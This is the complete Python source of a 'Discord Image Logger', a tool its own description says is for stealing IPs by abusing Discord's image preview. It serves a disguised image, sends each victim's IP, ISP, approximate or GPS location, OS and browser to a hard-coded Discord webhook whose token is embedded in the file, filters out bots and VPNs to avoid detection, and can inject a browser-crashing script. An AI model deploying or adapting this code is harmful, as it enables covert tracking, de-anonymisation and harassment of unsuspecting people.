# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1211056631081865237/ScOsgD405KqqEKIgje6oRLmViqaJOAPokaYW8HcdFDZ9MZmWSYp9mgKVD1NR0lCqnc4P",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
